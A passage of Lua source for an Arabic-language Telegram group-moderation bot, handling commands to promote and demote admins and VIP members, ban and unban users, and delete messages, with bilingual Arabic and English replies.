local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم الغاء « خاصيه تغيير الاسم »\n👤╿❯ صلاحياته الان •\n☑️┊❯ حذف الرسائل •\n☑️┊❯ الدعوه بالرابط •\n☑️╽❯ تثبيت الرسائل •*', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^الغاء خاصيه التثبيت$")  and is_monsh(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_ 
if user_info_ then
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=false&can_promote_members=false")
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم الغاء « خاصيه التثبيت »\n👤╿❯ صلاحياته الان •\n☑️┊❯ حذف الرسائل •\n☑️┊❯ الدعوه بالرابط •*', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
------------------------------------------bot-----------------------------------------------------
local text = msg.content_.text_:gsub('رفع ادمن','Promote')
if text:match("^[Pp]romote$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
function promote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:momod:'..msg.chat_id_
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a moderator ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن » سابقا*', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been promote ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن » بنجاح*', 1, 'md')
end
botx1:sadd(BOT..hash, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
-----------------------------------------bot------------------------------------------------------
if text:match("^[Pp]romote @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, "^([Pp]romote) @(.*)$")}
function promote_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to moderator ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن » بنجاح*'
end
botx1:sadd(BOT..'bot:momod:'..msg.chat_id_, result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promote_by_username)
end
-------------------------------------bot----------------------------------------------------------
if text:match("^[Pp]romote (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local ap = {string.match(text, "^([Pp]romote) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been promote ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « ادمن » بنجاح*', 1, 'md')
end
end
botx1:sadd(BOT..'bot:momod:'..msg.chat_id_, ap[2])
end
-----------------------------------------bot------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل ادمن','Demote')
if text:match("^[Dd]emote$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
function demote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:momod:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🚩|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not promote ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم رفعه « ادمن » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from promoted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *الادمن* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه الادمنيه »*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
-------------------------------------------bot----------------------------------------------------
if text:match("^[Dd]emote @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local hash = 'bot:momod:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emote) @(.*)$")}
function demote_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ *الادمن* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه الادمنيه »*'
end
botx1:srem(BOT..hash, result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demote_by_username)
end
------------------------------------------bot-----------------------------------------------------
if text:match("^[Dd]emote (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
local hash = 'bot:momod:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emote) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| was demoted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *الادمن* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه الادمنيه »*', 1, 'md')
end
end
botx1:srem(BOT..hash, ap[2])
end
-----------------------------------------bot------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
local text = msg.content_.text_:gsub('رفع مميز','Setvip')
if text:match("^[Ss]etvip$") and msg.reply_to_message_id_ ~= 0  then
function promote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:vipmem:'..msg.chat_id_
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « عضو مميز » سابقا*', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🚩|| has been a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « عضو مميز »*', 1, 'md')
end
botx1:sadd(BOT..hash, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
----------------------------------------bot-------------------------------------------------------
if text:match("^[Ss]etvip @(.*)$") then
local ap = {string.match(text, "^([Ss]etvip) @(.*)$")}
function promote_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « عضو مميز »*'
end
botx1:sadd(BOT..'bot:vipmem:'..msg.chat_id_, result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],promote_by_username)
end
-------------------------------bot----------------------------------------------------------------
if text:match("^[Ss]etvip (%d+)$") then
local ap = {string.match(text, "^([Ss]etvip) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم رفعه « عضو مميز »*', 1, 'md')
end
end
botx1:sadd(BOT..'bot:vipmem:'..msg.chat_id_, ap[2])
end
-------------------------------------bot----------------------------------------------------------
local text = msg.content_.text_:gsub('تنزيل مميز','Demvip')
if text:match("^[Dd]emvip$") and msg.reply_to_message_id_ ~= 0 then
function demote_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:vipmem:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم رفعه « مميز » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المميز* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه التمييز »*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
-----------------------------------------bot------------------------------------------------------
if text:match("^[Dd]emvip @(.*)$") then
local hash = 'bot:vipmem:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emvip) @(.*)$")}
function demote_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted from VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ *المميز* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه التمييز »*'
end
botx1:srem(BOT..hash, result.id_)
else
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*📌|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],demote_by_username)
end
--------------------------------bot---------------------------------------------------------------
if text:match("^[Dd]emvip (%d+)$") then
local hash = 'bot:vipmem:'..msg.chat_id_
local ap = {string.match(text, "^([Dd]emvip) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..ap[2]..' ، 🚷\n🎈|| was removed from VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المميز* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم تنزيله من « قائمه التمييز »*', 1, 'md')
end
end
botx1:srem(BOT..hash, ap[2])
end
end
----------------------------------------bot--------------------------------------------------------------       
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Dd]el$") or text:match("^مسح$") and msg.reply_to_message_id_ ~= 0 then
local id = msg.id_
local msgs = {[0] = id}
delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
delete_msg(msg.chat_id_,msgs)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم مسح الرساله مع رساله الامر •', 1, 'md')
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text:match("^تفعيل الحظر$") or text:match("^تفعيل الطرد$") then
botx1:del("bot:lock:ban"..bot_id..msg.chat_id_)
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل الحظر •', 1, 'md')
end
if text:match("^تعطيل الحظر$") or text:match("^تعطيل الطرد$") and is_monsh(msg.sender_user_id_, msg.chat_id_) then
botx1:set("bot:lock:ban"..bot_id..msg.chat_id_,"bot")
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل الحظر •', 1, 'md')
end
end
-----------------------------------------bot-----------------------------------------------------
local text = msg.content_.text_:gsub('حظر','Ban') 
if text:match("^[Bb]an$") and msg.reply_to_message_id_ ~= 0 then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and botx1:get("bot:lock:ban"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع الحظر او الطرد •\n🌿⁞ لانه معطل من قبل المنشئ •', 1, 'md')
return "bot"
end
function ban_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:banned:'..msg.chat_id_
if not is_momod(result.sender_user_id_, result.chat_id_) then
if botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is already banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم « حظره » سابقا*', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
else
botx1:sadd(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n📌|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم « حظره » من المجموعه*', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end  
---------------------------------------bot--------------------------------------------------------
if text:match("^[Bb]an @(.*)$") then
local ap = {string.match(text, "^([Bb]an) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and botx1:get("bot:lock:ban"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع الحظر او الطرد •\n🌿⁞ لانه معطل من قبل المنشئ •', 1, 'md')
return "bot"
end
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if not is_momod(result.id_, msg.chat_id_) then
botx1:sadd(BOT..'bot:banned:'..msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم « حظره » من المجموعه'
end
chat_kick(msg.chat_id_, result.id_)
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1,text, 1, 'html')
end
resolve_username(ap[2],ban_by_username)
end
----------------------------------bot-------------------------------------------------------------
if text:match("^[Bb]an (%d+)$") then
local ap = {string.match(text, "^([Bb]an) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and botx1:get("bot:lock:ban"..bot_id..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع الحظر او الطرد •\n🌿⁞ لانه معطل من قبل المنشئ •', 1, 'md')
return "bot"
end
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if not is_momod(ap[2], msg.chat_id_) then
botx1:sadd(BOT..'bot:banned:'..msg.chat_id_, ap[2])
chat_kick(msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم « حظره » من المجموعه*', 1, 'md')
end
end
end
end
-----------------------------------bot------------------------------------------------------------
local text = msg.content_.text_:gsub('مسح الكل','Delall')
if text:match("^[Dd]elall$") and msg.reply_to_message_id_ ~= 0 then
function delall_by_reply(extra, result, success)
del_all_msgs(result.chat_id_, result.sender_user_id_)
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
end
---------------------------------------bot--------------------------------------------------------
if text:match("^[Dd]elall (%d+)$") then
local ass = {string.match(text, "^([Dd]elall) (%d+)$")}
if not ass then
return false
else
del_all_msgs(msg.chat_id_, ass[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, ' All messages from User : '..ass[2]..' has been deleted ', 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, '✺❘ كل رسائل العضو : '..ass[2]..'\n ✺❘ تم حذفها ✅', 1, 'html')
end
end
end
-----------------------------------bot------------------------------------------------------------
if text:match("^[Dd]elall @(.*)$") then
local ap = {string.match(text, "^([Dd]elall) @(.*)$")}
function delall_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
del_all_msgs(msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| All messages from User ؛ '..result.id_..' ، 🚷\n🎈|| has been deleted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
text = '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم « مسح كل رسائله » *'
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| Username is not correct ❎*'
else
text = '🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],delall_by_username)
end
-------------------------------------bot----------------------------------------------------------
local text = msg.content_.text_:gsub('الغاء حظر','Unban')
if text:match("^[Uu]nban$") and msg.reply_to_message_id_ ~= 0 then
function unban_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:banned:'..msg.chat_id_
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم « حظره » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المحظور* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم « الغاء حظره » من المجموعه*', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
end
---------------------------------bot--------------------------------------------------------------
if text:match("^[Uu]nban @(.*)$") then
local ap = {string.match(text, "^([Uu]nban) @(.*)$")}
function unban_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if not botx1:sismember(BOT..'bot:banned:'..msg.chat_id_, result.id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.id_..' ، 🚦\n🎈|| is not banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
text = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ لم يتم « حظره » سابقا'
end
else
botx1:srem(BOT..'bot:banned:'..msg.chat_id_, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
text = '👤╿❯ المحظور « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم « الغاء حظره » من المجموعه'
end
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '*🎈|| Username is not correct ❎*'
else
text = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],unban_by_username)
end
--------------------------------bot---------------------------------------------------------------
if text:match("^[Uu]nban (%d+)$") then
local ap = {string.match(text, "^([Uu]nban) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if not botx1:sismember(BOT..'bot:banned:'..msg.chat_id_, ap[2]) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*📌|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *لم يتم « حظره » سابقا*', 1, 'md')
end
else
botx1:srem(BOT..'bot:banned:'..msg.chat_id_, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been unbanned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
